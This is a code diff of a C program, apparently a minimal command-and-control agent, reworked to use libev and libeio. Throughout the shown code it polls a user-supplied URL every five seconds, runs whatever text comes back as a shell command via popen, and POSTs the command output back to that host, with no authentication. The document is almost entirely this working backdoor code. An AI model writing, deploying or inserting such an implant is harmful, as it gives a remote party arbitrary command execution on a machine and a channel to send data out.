@@ -27,8 +27,67 @@
 #include <string.h>
 
 #include <curl/curl.h>
+#include <ev.h>
+#include <eio.h>
 
 #define MAX_BUFFER 1024
+#define CORE_EV_FLAGS EVFLAG_NOENV | EVBACKEND_SELECT | EVFLAG_FORKCHECK
+
+static struct ev_idle eio_idle_watcher;
+static struct ev_async eio_async_watcher;
+
+struct async_handle_data
+{
+    char url[MAX_BUFFER];
+    char command[MAX_BUFFER];
+};
+
+static void eio_idle_cb(struct ev_loop *loop, struct ev_idle *w, int revents)
+{
+    if (eio_poll() != -1)
+    {
+        ev_idle_stop(loop, w);
+    }
+}
+
+static void eio_async_cb(struct ev_loop *loop, struct ev_async *w, int revents)
+{
+    if (eio_poll() == -1)
+    {
+        ev_idle_start(loop, &eio_idle_watcher);
+    }
+
+    ev_async_start(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
+}
+
+static void eio_want_poll(void)
+{
+    ev_async_send(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
+}
+
+static void eio_done_poll(void)
+{
+    ev_async_stop(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
+}
+
+static void core_signal_handler(struct ev_loop *loop, ev_signal *w, int revents)
+{
+    switch (w->signum)
+    {
+        case SIGINT:
+            printf("* Core has SIGINT caught\n");
+            ev_break(loop, EVBREAK_ALL);
+            break;
+
+        case SIGTERM:
+            printf("* Core has SIGTERM caught\n");
+            ev_break(loop, EVBREAK_ALL);
+            break;
+
+        default:
+            break;
+    }
+}
 
 // Function to write the response data from GET request
 size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data)
@@ -50,12 +109,9 @@ size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data)
 void send_post_request(const char *url, const char *data)
 {
     CURL *curl;
-    CURLcode res;
-    struct curl_slist *headers;
+    CURLcode status;
+    struct curl_slist *headers = NULL;
 
-    headers = NULL;
-
-    curl_global_init(CURL_GLOBAL_DEFAULT);
     curl = curl_easy_init();
 
     if (curl)
@@ -65,82 +121,111 @@ void send_post_request(const char *url, const char *data)
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
-        res = curl_easy_perform(curl);
+        status = curl_easy_perform(curl);
 
-        if (res != CURLE_OK)
-        {
-            fprintf(stderr, "POST request failed: %s\n", curl_easy_strerror(res));
+        if (status != CURLE_OK) {
+            fprintf(stderr, "POST request failed: %s\n", curl_easy_strerror(status));
         }
 
         curl_easy_cleanup(curl);
         curl_slist_free_all(headers);
     }
-
-    curl_global_cleanup();
 }
 
-int main()
+// Function to execute a command asynchronously
+static void execute_command(eio_req *request)
+{
+    struct async_handle_data *data;
+    char output[MAX_BUFFER];
+    FILE *fp;
+
+    data = request->data;
+    fp = popen(data->command, "r");
+
+    if (fp == NULL)
+    {
+        perror("popen failed");
+        return;
+    }
+
+    memset(output, '\0', MAX_BUFFER);
+
+    while (fread(output, 1, MAX_BUFFER, fp) > 0)
+    {
+        send_post_request(data->url, output);
+        memset(output, 0, MAX_BUFFER);
+    }
+
+    pclose(fp);
+}
+
+// Callback for libev loop
+static void async_command_cb(EV_P_ ev_timer *w, int revents)
 {
     CURL *curl;
     CURLcode status;
 
-    char get_url[] = "http://127.0.0.1:8080/"; // Change to your server's URL
-    char post_url[] = "http://127.0.0.1:8080/"; // Change to your server's URL
+    struct async_handle_data *data;
+    data = w->data;
 
-    char command[MAX_BUFFER];
-    char output[MAX_BUFFER];
-    char *cmd_output;
-
-    FILE *fp;
-    size_t bytes_read;
-
-    // Initialize cURL
-    curl_global_init(CURL_GLOBAL_DEFAULT);
     curl = curl_easy_init();
-
     if (!curl)
     {
-        curl_global_cleanup();
-        return 1;
+        fprintf(stderr, "Failed to initialize CURL\n");
+        return;
     }
 
-    while (1)
+    memset(data->command, '\0', sizeof(data->command));
+    curl_easy_setopt(curl, CURLOPT_URL, data->url);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, data->command);
+
+    status = curl_easy_perform(curl);
+    if (status != CURLE_OK)
     {
-        // Send GET request to get command
-        curl_easy_setopt(curl, CURLOPT_URL, get_url);
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, command);
-        status = curl_easy_perform(curl);
-
-        if (status != CURLE_OK)
-        {
-            fprintf(stderr, "GET request failed: %s\n", curl_easy_strerror(status));
-            break;
-        }
-
-        // Execute the command using popen
-        fp = popen(command, "r");
-        if (fp == NULL)
-        {
-            perror("popen failed");
-            break;
-        }
-
-        memset(output, 0, sizeof(output));
-
-	    // Read the command output
-	    while ((bytes_read = fread(output, 1, sizeof(output) - 1, fp)) > 0)
-		{
-   			send_post_request(post_url, output);
-   			memset(output, 0, sizeof(output));
-		}
-
-        // Send POST request with the command output
-        send_post_request(post_url, output);
+        fprintf(stderr, "GET request failed: %s\n", curl_easy_strerror(status));
+        curl_easy_cleanup(curl);
+        return;
     }
 
     curl_easy_cleanup(curl);
-    curl_global_cleanup();
+    eio_custom(execute_command, 0, NULL, data);
+}
+
+int main(int argc, char *argv[])
+{
+    ev_timer timer;
+    struct ev_loop *loop;
+    struct async_handle_data *data;
+
+    if (argc != 2)
+    {
+        fprintf(stderr, "Usage: %s <URL>\n", argv[0]);
+        return 1;
+    }
+
+    data = calloc(1, sizeof(*data));
+
+    if (data == NULL)
+    {
+        fprintf(stderr, "Failed to allocate space for data\n");
+        return 1;
+    }
+
+    loop = ev_default_loop(CORE_EV_FLAGS);
+
+    ev_idle_init(&eio_idle_watcher, eio_idle_cb);
+    ev_async_init(&eio_async_watcher, eio_async_cb);
+    eio_init(eio_want_poll, eio_done_poll);
+
+    ev_timer_init(&timer, async_command_cb, 0., 5.); // Poll every 5 seconds
+    strncpy(data->url, argv[1], strlen(argv[1]));
+
+    timer.data = data;
+    ev_timer_start(loop, &timer);
+
+    ev_run(loop, 0);
+    free(data);
 
     return 0;
 }
